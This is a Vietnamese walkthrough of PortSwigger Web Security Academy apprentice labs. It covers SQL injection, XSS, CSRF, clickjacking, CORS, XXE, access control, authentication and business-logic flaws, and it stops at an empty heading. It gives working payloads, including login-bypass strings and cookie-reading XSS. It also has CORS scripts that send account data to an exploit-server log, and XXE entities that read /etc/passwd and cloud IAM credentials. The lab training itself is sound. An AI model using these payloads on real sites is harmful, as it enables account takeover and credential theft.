# Apprentice Level  
## SQL Injection  
### Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data  
Chỉnh sửa tham số **category**: 
```
/filter?category=Lifestyle%27or%201=1--%20-
```  
    
![SQL Injection_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/SQL%20Injection_1.png)  
  
### Lab 02: SQL injection vulnerability allowing login bypass
Sử dụng Burp Suite bắt request login, chèn thêm **' or 1=1-- -**:
```
csrf=...&username=admin&password=abc'+or+1=1--+-
```  
  
![SQL Injection_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/SQL%20Injection_2.png)  
  
## Cros-site scripting
### Lab 01: Reflected XSS into HTML context with nothing encoded
Chèn **<script> alert(1) </script>** vào ô search của trang web:  
  
![Cross-site scripting_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_1.png)  
  
### Lab 02: Stored XSS into HTML context with nothing encoded
Chèn **<p> <script> alert(1) </script> <p>** vào ô comment của bài blog:  
  
![Cross-site scripting_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_2.png)  
  
### Lab 03: DOM XSS in *document.write* sink using source *location.search*
Sử dụng chức năng search với ký tự bất kỳ, ví dụ: **"a"**:  
  
![Cross-site scripting_3](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_3.png)  
  
Chèn **"> <script> alert(1) </script>**:
  
![Cross-site scripting_4](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_4.png)  
  
### Lab 04: DOM XSS in *innerHTML* sink using source *location.search*
Chèn **<\img src=1 onerror=alert(1)>** vào ô search:  
  
![Cross-site scripting_5](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_5.png)  
  
### Lab 05: DOM XSS in jQuery anchor *href* attribute sink using *location.search* source
Thay đổi tham số **returnPath** thành ký tự bất kỳ trong URL: **/feedback?returnPath=/post**  
  
![Cross-site scripting_6](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_6.png)  
  
Thay tham số **returnPath** thành **javascript:alert(document.cookie)**, và bấm chọn **Back**:  
  
![Cross-site scripting_7](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_7.png)  
  
### Lab 06: DOM XSS in jQuery selector sink using a hashchange event
Code **auto-scroll**:  
  
![Cross-site scripting_8](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_8.png)  
  
Sử dụng **exploit server**, chèn trong phần **Body**:
```
<iframe src="https://0af700a404372efac08d0a6000db00ca.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```  
Chọn **Deliver exploit to victim**:  
  
![Cross-site scripting_9](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_9.png)  
  
### Lab 07: Reflected XSS into attribute with angle brackets HTML-encoded
Chèn **"onmouseover="alert(1)**:  
  
![Cross-site scripting_10](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_10.png)  
  
### Lab 08: Stored XSS into anchor *href* attribute with double quotes HTML-encoded
Thử điền các nội dung mục comment:  
  
![Cross-site scripting_11](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_11.png)  
  
Nội dung mục **Website** đã được đưa vào *href* attribute:  
  
![Cross-site scripting_12](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_12.png)  
  
Chèn **javascript:alert(1)** vào mục **Website**:  
  
![Cross-site scripting_13](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_13.png)  
  
### Lab 09: Reflected XSS into a JavaScript string with angle brackets HTML encoded
Code **search**:  
  
![Cross-site scripting_14](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_14.png)  
  
Chèn **'-alert(1)-'** vào ô **search**:  
  
![Cross-site scripting_15](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_15.png)  

## Cross-site request forgery (CSRF)
### Lab 01: CSRF vulnerability with no defenses
Sử dụng Burp Suite bắt gói tin khi thay đổi email:  
  
![CSRF_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/CSRF_1.png)  
  
Sử dụng **exploit server**, chèn trong phần **Body**:
```
<form method="POST" action="https://0afc00da04de96bbc05b0c5f00960024.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="ckiev5@test.com">
</form>
<script>
        document.forms[0].submit();
</script>
```  
![CSRF_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/CSRF_2.png) 
  
## Clickjacking
### Lab 01: Basic clickjacking with CSRF token protection
Sử dụng Burp Suite bắt request khi sử dụng chức năng **Update email** và **Delete Account**:  
  
![Clickjacking_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Clickjacking_1.png)   
  

![Clickjacking_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Clickjacking_2.png)  
  
CSRF token: **H5RP9ZPx7GbsenbxblkX6cXnOTnXs5je**  
Sử dụng **exploit server**, chèn trong phần **Body**:  
```
<style>
    iframe {
        position:relative;
        width: 500;
        height: 700 ;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0ab4007904775bedc06216d2009e007d.web-security-academy.net/my-account"></iframe>
```  
### Lab 02: Clickjacking with form input data prefilled from a URL parameter
Sử dụng Burp Suite bắt request khi sử dụng chức năng **Update email**:  
  
![Clickjacking_3](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Clickjacking_3.png)  
  
Sử dụng **exploit server**, chèn trong phần **Body**:  
```
<style>
    iframe {
        position:relative;
        width: 500;
        height: 700 ;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a32009e031d6c37c01f249800a30029.web-security-academy.net/my-account?email=ckiev5@test.com"></iframe>
```  
### Lab 03: Clickjacking with a frame buster script
Tương tự như Lab 02:  
```
<style>
    iframe {
        position:relative;
        width: 500;
        height: 700 ;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://0a12002c03fdb39bc0d6f08500c8001a.web-security-academy.net/my-account?email=ckiev5@test.com"></iframe>
``` 
Lưu ý: Sử dụng **sandbox="allow-forms"** attribute để vô hiệu hóa frame buster script.  
## Cross-origin resource sharing (CORS)
### Lab 01: CORS vulnerability with basic origin reflection
Sử dụng **exploit server**, chèn trong phần **Body**:  
```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ae0008b03e66af4c0c52a7100cd0018.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```  
  
![CORS_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/CORS_1.png)  

### Lab 02: CORS vulnerability with trusted null origin
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a1c002a049b075ac0d751c8002d00c4.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0a95000b04fb07afc05151d901bb0086.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```  
## XXE Injection
### Lab 01: Exploiting XXE using external entities to retrieve files
  
![XXE Injection_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/XXE%20Injection_1.png)  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>&xxe;</productId><storeId>
1
</storeId></stockCheck>
```  
### Lab 02: Exploiting XXE to perform SSRF attacks
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>
&xxe;</productId><storeId>1</storeId></stockCheck>
```

![XXE Injection_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/XXE%20Injection_2.png)  
  
## Server-side request forgery (SSRF)
### Lab 01: Basic SSRF against the local server
  
![SSRF_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/SSRF_1.png)  
  
### Lab 02: 
  
![SSRF_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/SSRF_2.png)  
  
## OS command injection
### Lab 01: OS command injection, simple case
  
![OS command injection_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/OS%20command%20injection_1.png)  
  
## Directory traversal
### Lab 01: File path traversal, simple case
  
![Directory traversal_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Directory%20traversal_1.png)  
  
## Access control vulnerabilities
### Lab 01: Unprotected admin functionality
Kiểm tra file robots.txt
Truy cập url: https://0a66009104b68073c2ce74fd002c0081.web-security-academy.net/robots.txt  
```
User-agent: *
Disallow: /administrator-panel
```  
Truy cập url: https://0a66009104b68073c2ce74fd002c0081.web-security-academy.net/administrator-panel để xóa tk carlos  
### Lab 02: Unprotected admin functionality with unpredictable URL
Tìm trong html của trang web:  
  
![Access control_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Access%20control_1.png)  
  
### Lab 03: User role controlled by request parameter
Set cookie **Admin=true**
Truy cập admin panel để xóa tk carlos

### Lab 04: User role can be modified in user profile
Sử dụng Burp Suite bắt gói tin khi thực hiện chức năng thay đổi email, ta thấy ngoài trường **email** còn có thêm trường **roleid**. Thay đổi **roleid** thành **2** để truy cập vào admin panel.  
  
![Access control_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Access%20control_2.png)  
  
### Lab 05: User ID controlled by request parameter
Truy cập https://0a2c00520326125ac06e165000b1008d.web-security-academy.net/my-account?id=carlos để lấy API tk carlos.  
### Lab 06: User ID controlled by request parameter, with unpredictable user IDs
Truy cập các bài post do carlos đăng, lấy được GUIDs của carlos:  
  
![Access control_3](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Access%20control_3.png)  
  
### Lab 07: User ID controlled by request parameter with data leakage in redirect
Truy cập https://0af0002b047bf620c0e3db6200c400f3.web-security-academy.net/my-account?id=carlos  
  
![Access control_5](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Access%20control_5.png)  
  
### Lab 08: User ID controlled by request parameter with password disclosure
Truy cập https://0a8e00e0048e2f88c0fad90700440085.web-security-academy.net/my-account?id=administrator để lấy mật khẩu tài khoản administrator:
  
![Access control_4](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Access%20control_4.png)  
  
### Lab 09: Insecure direct object references
Trang web có chức năng cho tải transcript: https://0ac1009a04a938a9c0c71a1c00b500de.web-security-academy.net/download-transcript/2.txt
Thử tải file 1.txt:
```
CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is v8vi1tnm51sggmvom78b. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```  
## Authentication
### Lab 01: Username enumeration via different responses
Sử dụng Burp Suite brute force username, password:
```
user:football
```  
### Lab 02: 2FA simple bypass
Đăng nhập tài khoản **carlos:montoya** sau đó bỏ qua bước nhập code và truy cập đến địa chỉ: https://0a2a002d04bc5d03c0d82d52005a006c.web-security-academy.net/my-account  
### Lab 03: Password reset broken logic
Sử dụng url reset password của tk weiner để thay đổi password tài khoản carlos:  
  
![Authentication_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Authentication_1.png)  
  
## WebSockets
### Lab 01: Manipulating WebSocket messages to exploit vulnerabilities
Gửi tin nhắn **<\img src=1 onerror='alert(1)'>** tới server:  
  
![Websockets_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Websockets_1.png)  
  
## Insecure deserialization
### Lab 01: Modifying serialized objects
Kiểm tra session của tk wiener:  
  
![Insecure deserialization_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Insecure%20deserialization_1.png)  
  
Set **s:5:"admin";b;0** thành **s:5:"admin";b;1**. Gửi request delete tk carlos:  
  
![Insecure deserialization_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Insecure%20deserialization_2.png)  
  
## Information disclosure
### Lab 01: Information disclosure in error messages
Truy cập: https://0aac00dc031599bcc0bc27d4007e005a.web-security-academy.net/product?productId=a  
Trang web hiển thị thông báo lỗi có kèm theo version của framework: **Apache Struts 2 2.3.31**  
### Lab 02: Information disclosure on debug page
Truy cập: https://0ab40055044f1c45c0fa1039006a00f9.web-security-academy.net/cgi-bin/phpinfo.php  
Tìm SECRET_KEY: b7aqk14xwzjk0djfr3w44elpn8dp9aeo  
### Lab 03: Source code disclosure via backup files
Truy cập: https://0a2400f8045fbe33c0e141ee00810021.web-security-academy.net/backup  
Tải file **ProductTemplate.java.bak**  
Mật khẩu: **pc21wjqcglb0xgjzhgqe2grbblxu6mwf**  
### Lab 04: Authentication bypass via information disclosure
Sử dụng chức năng Repeater của Burp Suite, truy cập GET /admin, ta thấy có thể truy cập admin panel bằng địa chỉ local ip.  
Truy cập TRACE /admin, có header  X-Custom-IP-Authorization chứa thông tin địa chỉ IP của máy tính. Header này được sử dụng để xác định request có phải thực hiện từ localhost IP address hay không.  
Sử dụng chức năng Proxy>Option>Match and Replace, thêm X-Custom-IP-Authorization: 127.0.0.1. Truy cập admin panel để xóa tk carlos.  
## Business logic vulnerabilities
### Lab 01: Excessive trust in client-side controls
Sử dụng Burp Suite bắt gói tin khi thay đổi số lượng sản phẩm thanh toán:    
  
![Business logic vulnerabilities_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Business%20logic%20vulnerabilities_1.png)  
  
Thay đổi giá của item, sau đó tải lại trang thanh toán:  
  
![Business logic vulnerabilities_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Business%20logic%20vulnerabilities_2.png)  
  
### Lab 02: High-level logic vulnerability
Sử dụng Burp Suite bắt gói tin khi thay đổi số lượng sản phẩm thanh toán, có thể để số lượng sản phẩm có giá trị âm dẫn đến giá trị sản phẩm âm. Trang thanh toán chỉ yêu cầu tổng giá trị thanh toán phải dương vì vậy chỉ cần thêm một sản phẩm khác có số lượng sản phẩm âm để giảm tổng giá trị thanh toàn xuống dưới 100$.  
  
![Business logic vulnerabilities_3](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Business%20logic%20vulnerabilities_3.png)  
  
### Lab 03: Inconsistent security controls
Phần Register có thông tin về việc nếu là nhân viên thì đăng ký với email đuôi @dontwannacry.com. Vì vậy, lập một tài khoản với email trong Email Client sau đó cập nhật email với đuôi @dontwannacry.com thì có thể truy cập admin panel để xóa tk carlos.  
### Lab 04: Flawed enforcement of business rules
Khi đăng ký nhận tin qua email, nhận được thêm 1 COUPON giảm giá SIGNUP30. Áp 2 lần liên tiếp mã COUPON NEWCUTS5 hoặc SIGNUP30 sẽ bị lỗi đã áp dụng mã giảm giá nhưng nếu áp dụng lần lượt, hệ thống sẽ so sánh với mã giảm giá gần nhất được áp dụng vậy nên có thể áp nhiều lần mã NEWCUTS5 và SIGNUP30 đến khi giá trị đơn hàng về 0$.  
  
![Business logic vulnerabilities_4](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Business%20logic%20vulnerabilities_4.png)  
  
## HTTP Host header attacks
### Lab 01: 